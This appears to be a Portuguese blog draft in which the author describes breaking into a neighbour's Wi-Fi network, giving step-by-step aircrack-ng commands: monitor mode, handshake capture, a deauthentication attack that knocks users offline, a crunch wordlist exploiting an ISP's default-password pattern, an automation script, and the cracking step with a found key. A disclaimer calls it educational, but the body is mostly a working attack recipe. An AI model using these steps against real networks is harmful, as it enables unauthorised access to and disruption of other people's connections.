---
title: Invadindo rede wifi na prática
description: Mostrando como hackeei a rede wifi de uma vizinha da minha mãe
tags: ["Wifi Hacking", "Shell Script", "Brute Force"]
categories: ["SecLab", "Way Of Security"]
pin: true
draft: true
date: 2023-08-25 08:19:12 +02:00
author: matheus
---

# Hackeando redes sem fio na prática

Neste artigo vou mostrar para vocês como funciona na prática a invasão de uma rede wireless, e como foi minhas primeiras experiências hackeando redes wifi reais.

Será considerado que você já sabe do básico de redes wireless, como funcionam os protocolos e conceitos, pois eles não serão explicados aprofundadamente nesta publicação. Para isso, teremos uma postagem específica que correrá por toda essa base de forma detalhada.

### O que esperar desta publicação

Nesta postagem será esperado algumas explicações mais _técnicas_ - mas não aprofundadas - dos passos e ferramentas utilizadas no processo, pois o foco é mostrar a prática de uma **invasão em redes wireless** alheias utilizando pacote **Aircrakc-ng**, e *como foi a minha experiência descobrindo uma falha nas credenciais padrões de roteadores de uma grande operadora*, que me permitia **descobrir e ter acesso a qualquer rede que não tivesse alterado as credencias padrões**.

>
>*Vale já esclarecer que o intuito deste tópico é totalmente educativo e não me responsabilizo por nenhum ato de terceiro.* 

>*Deixo* claro *também que, apesar dos pesares, nenhum ato de intenção malígna foi feito e a* operadora *em questão já atualizou sua forma de padronização de credenciais. Por este motivo resolvi repostar sobre esta falha protocolar, visto que muitos usuários ainda podem estar utilizando e ficando vulneráveis e precisam se atentar a isso.*

 - aviso rapido
> A operadora tinha me pedido para tirar o script do ar na epoca, hj com o padrão mais seguro, coloco este documento com script de forma a esconder o nome da empresa mas deixando claro a vulnerabilidade que os usuários podem estar deixando passar. - Este documento ainda não está terminado, em breve mais informações, mas a parte prática já está lançada.

# Passo a passo prático

> Todo o processo foi feito dentro de um mesmo diretório

### Criando documento para salvar informação útil

```bash
nano < nome >
```
`Exemplo: nano infos`

### Anotar sobre a interface de rede

```bash
iwconfig
```

### Ativar modo de monitoramento

```bash
sudo airmon-ng start < interface >
```
`Exemplo: sudo airmon-ng start wlp1s0` -> resultando na interface em modo mon: `wlp1s0mon`

Utilize o "stop" para desativar, além de pode utilizar o comando com "status" para verificar se está ativado ou desativado. 
 > Lembre-se de que o modo de monitoramento te desconecta da sua rede.

### Monitorar redes wi-fi próximas

```bash
sudo airodump-ng < interfacemon >
```
`Exemplo: sudo airodump-ng wlp1s0mon`

 Não esquecer de anotar as informações adquiridas nesta parte no seu documento, como ESSID (nome da rede), BSSID (endereço mac/físico) e o CH (canal).

### Monitoramento específico com captura de '.cap'

```bash
sudo airodump-ng --bssid < mac > -c < CH > -w < nome > < interfacemon >
```

ou

```bash
sudo airodump-ng --essid < wifi > -c < CH > -w < nome > < interfacemon >
```

ou

```bash
sudo airodump-ng --essid < nomeWiFi > -w < nomeArquivo > < interfacemon >
```

`Exemplo: sudo airodump-ng --essid KL4N0_2G5G672U -c 1 -w APtura wlan0mon`

 Recomendado ser mais específico, por exemplo, deixar claro o canal de funcionamento e o endereço físico. 
 
 Agora a tabela de monitoramento vai ser apenas na rede especificada, como poderá ser visto na tabela de cima, e com a tabela de baixo mostrando os dispositivos que se comunicam com esta rede. 
 
 > Agora pode existir algum tipo de ataque direto em um usuário de uma rede, por exemplo para ser desconectado, ou numa rede inteira que afetaria todos os conectados nela.
 
 Colocar o BSSID do(s) alvo(s) no documento e abra uma outra sessão/aba no terminal.

### Ataque de desautenticação de usuário(s)

```bash
sudo aireplay-ng --deauth < númeroPacotes > -a < bssidAlvo > < interfacemon >
```
 Usando `aireplay` enquanto roda o monitoramento dessa rede em outra sessão do terminal / em segundo plano, pode ser visto o alvo sendo desconectado, sendo forçado a se reconectar e a **captura do handshake**. Quando a captura ocorrer, então o processo foi finalizado.

### Criação da wordlist das redes vulneráveis para força bruta

```bash
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@PADRAO -o nomeWL
```
 Rede alvo com padrão vulnerável -> essid: `KL4N0_2G5G672U` -> os 6 últimos dígitos também são os últimos 6 da senha (de 8 dígitos) -> 5G672U

 `Exemplo: crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@5G672U -o wl`

> É possível reconhecer que é fácil de automatizar isso em shell script, né? bem fácil... tendo em vista que o código padrão q é usado no nome e na senha nunca será o mesmo da de outra rede, então precisamos fazer o script funcionar de acordo com o nome da rede fornecida.

#### Automatizando a criação da wordlist

Fazendo a wordlist perfeita para as redes que seguem o mesmo padrão.

> padrão de exemplo: KL4N0_2G5G672U:xx5G672U para descobrirmos o valor de `xx`

```sh
#!/bin/bash
read -p "Digite o nome da rede alvo (essid): " essid
echo $essid | cut -d "G" -f 2 > wifi.txt && crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@$(cat wifi.txt) -o wl &>/dev/null && rm wifi.txt
sleep 0.35s
echo "Wordlist criada com sucesso!"
sleep 0.2s
echo "Arquivo salvo como wl"
```

### Quebrando a senha da rede sem fio alvo

```bash
sudo aircrack-ng -a2 -e < "ESSID_Rede" > < "NomeArquivoCap*" > -w < wordlist >
```

    Resultado de exemplo da rede KL4N0_2G5G672U -> Key Found! [325G672U]
    
> Não esquecer de dar o `airmon-ng stop wlp1s0mon`